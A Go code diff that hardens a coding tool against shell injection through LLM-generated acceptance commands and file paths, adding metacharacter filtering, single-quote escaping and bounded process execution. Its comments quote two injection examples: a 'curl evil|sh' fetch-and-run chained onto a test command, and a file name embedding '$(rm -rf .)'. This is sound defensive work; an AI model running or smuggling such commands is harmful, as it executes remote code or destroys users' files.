@@ -12,6 +12,7 @@ import (
 	"time"
 
 	"github.com/UnicoLab/slmcode/pkg/plan"
+	"github.com/UnicoLab/slmcode/pkg/workspace"
 )
 
 // SmokeResult is the outcome of a deterministic (non-LLM) verification command.
@@ -132,7 +133,9 @@ func DetectPostWorkerCommand(root string, files []string) string {
 	var py, goFiles, jsFiles, tsFiles []string
 	for _, f := range files {
 		f = strings.TrimSpace(f)
-		if f == "" || strings.Contains(f, "..") {
+		// Focus paths are LLM-authored; anything that is not a plain path is
+		// dropped rather than quoted, so it can never reach a command line.
+		if !SafeFocusPath(f) {
 			continue
 		}
 		switch strings.ToLower(filepath.Ext(f)) {
@@ -401,11 +404,18 @@ func ExtractAcceptanceCommands(acceptance string) []string {
 			cmd := strings.TrimSpace(line[idx:])
 			// Cut trailing prose after the command (period+space, " exits", " prints").
 			for _, stop := range []string{" exits", " prints", " returns", " —", " - ", ". ", " ("} {
-				if i := strings.Index(strings.ToLower(cmd), stop); i >= len(p) {
+				i := strings.Index(strings.ToLower(cmd), stop)
+				// ". " must not chop a package pattern: "go test ./... -short"
+				// used to be truncated to the unusable "go test ./".
+				if stop == ". " && i > 0 && cmd[i-1] == '.' {
+					i = -1
+				}
+				if i >= len(p) {
 					cmd = strings.TrimSpace(cmd[:i])
 				}
 			}
 			cmd = strings.TrimRight(cmd, ".,;:")
+			cmd = SanitizeAcceptanceCommand(cmd, prefix)
 			if cmd == "" || seen[cmd] {
 				continue
 			}
@@ -415,6 +425,52 @@ func ExtractAcceptanceCommands(acceptance string) []string {
 		}
 	}
 	return out
+}
+
+// acceptanceShellMeta are characters that turn a whitelisted prefix into an
+// arbitrary command. Acceptance text is LLM-generated, and the old code
+// whitelisted a prefix then handed line[idx:] verbatim to `bash -lc`, so
+// "go test ./... && curl evil|sh" passed the whitelist untouched.
+const acceptanceShellMeta = "&|;`$(){}<>\\\n\r\"'*?!~#"
+
+// SanitizeAcceptanceCommand returns cmd if it is a plain argv-shaped command
+// starting with prefix, else "". No shell metacharacter survives.
+func SanitizeAcceptanceCommand(cmd, prefix string) string {
+	cmd = strings.TrimSpace(cmd)
+	if cmd == "" || len(cmd) > 300 {
+		return ""
+	}
+	if !strings.HasPrefix(strings.ToLower(cmd), strings.ToLower(strings.TrimSpace(prefix))) {
+		return ""
+	}
+	if strings.ContainsAny(cmd, acceptanceShellMeta) {
+		return ""
+	}
+	for _, r := range cmd {
+		if r < 0x20 || r == 0x7f {
+			return ""
+		}
+	}
+	// Every token must look like a flag, a path, or a simple identifier.
+	for _, tok := range strings.Fields(cmd) {
+		if !acceptanceToken(tok) {
+			return ""
+		}
+	}
+	return cmd
+}
+
+func acceptanceToken(tok string) bool {
+	for _, r := range tok {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
+		case r == '.' || r == '/' || r == '_' || r == '-' || r == '=' || r == ':' ||
+			r == '+' || r == '@' || r == ',' || r == '[' || r == ']':
+		default:
+			return false
+		}
+	}
+	return true
 }
 
 // RunAcceptanceSmoke runs whitelisted acceptance commands; first failure wins.
@@ -575,6 +631,9 @@ func HasSmokeCommand(root string, files []string) bool {
 	return DetectPostWorkerCommand(root, files) != ""
 }
 
+// runCommand executes a QA/smoke command with a hard timeout, in its own
+// process group (so `go test` children are killed too), with bounded output
+// and `bash -c` rather than a login shell.
 func runCommand(ctx context.Context, root, command string, timeout time.Duration) (string, error) {
 	if timeout <= 0 {
 		timeout = 3 * time.Minute
@@ -582,19 +641,16 @@ func runCommand(ctx context.Context, root, command string, timeout time.Duration
 	if timeout > 8*time.Minute {
 		timeout = 8 * time.Minute
 	}
-	cctx, cancel := context.WithTimeout(ctx, timeout)
-	defer cancel()
-	cmd := exec.CommandContext(cctx, "bash", "-lc", command)
-	cmd.Dir = root
-	var buf bytes.Buffer
-	cmd.Stdout = &buf
-	cmd.Stderr = &buf
-	err := cmd.Run()
-	out := buf.String()
+	res := workspace.RunBounded(ctx, root, command, timeout, 128*1024)
+	out := res.Output
 	if len(out) > 20_000 {
 		out = out[:20_000] + "\n...[truncated]"
 	}
-	return out, err
+	if res.TimedOut {
+		return out, fmt.Errorf("command timed out after %s and its process group was killed: %s",
+			timeout, firstLine(command))
+	}
+	return out, res.Err
 }
 
 // DetectProjectLanguage returns the primary language of a project based on
@@ -774,14 +830,47 @@ func hasGoSources(root string) bool {
 	return false
 }
 
+// shellQuote wraps s in POSIX SINGLE quotes.
+//
+// Double quotes do NOT suppress $(…), `…` or $VAR, and these paths come from
+// LLM-authored task focus files — a file named `$(rm -rf .).py` used to be
+// interpolated straight into a bash command line.
 func shellQuote(s string) string {
 	if s == "" {
-		return `""`
+		return "''"
 	}
-	if !strings.ContainsAny(s, " \t\"'\\$`") {
+	if safeShellWord(s) {
 		return s
 	}
-	return `"` + strings.ReplaceAll(s, `"`, `\"`) + `"`
+	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
+}
+
+// safeShellWord reports a path that needs no quoting at all.
+func safeShellWord(s string) bool {
+	for _, r := range s {
+		switch {
+		case r >= 'a' && r <= 'z', r >= 'A' && r <= 'Z', r >= '0' && r <= '9':
+		case r == '.' || r == '/' || r == '_' || r == '-' || r == '+' || r == '@':
+		default:
+			return false
+		}
+	}
+	return true
+}
+
+// SafeFocusPath reports whether a task focus path may be placed on a command
+// line at all. Anything outside [A-Za-z0-9._/@+-] is rejected before quoting,
+// as defence in depth: no shell metacharacter, newline, or NUL ever reaches
+// bash, regardless of quoting bugs.
+func SafeFocusPath(p string) bool {
+	p = strings.TrimSpace(p)
+	if p == "" || len(p) > 512 {
+		return false
+	}
+	if strings.HasPrefix(p, "-") || strings.Contains(p, "..") {
+		return false
+	}
+	return safeShellWord(p)
 }
 
 func firstLine(s string) string {
